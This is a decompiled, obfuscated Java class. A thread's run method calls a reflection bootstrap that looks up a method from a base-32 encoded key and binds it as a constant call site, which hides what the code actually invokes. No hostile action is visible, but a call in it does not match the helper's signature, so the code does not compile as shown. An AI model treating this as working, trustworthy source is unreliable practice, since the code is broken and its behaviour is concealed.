/*
 * Decompiled with CFR 0_123.
 */
import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Method;

class MSHX$1
extends Thread {
    final /* synthetic */ MSHX RsxR;

    MSHX$1(MSHX mSHX) {
        this.RsxR = mSHX;
    }

    @Override
    public void run() {
        MSHX$1.ib((MSHX)o.a(this, 1229871540));
    }

    private static Object ib(Object object, Object object2, Object object3) {
        try {
            return new ConstantCallSite(((MethodHandles.Lookup)object).unreflect(o.Y(Integer.valueOf((String)object2, 32))).asType((MethodType)object3));
        }
        catch (ClassNotFoundException | IllegalAccessException reflectiveOperationException) {
            throw new BootstrapMethodError(reflectiveOperationException);
        }
    }
}

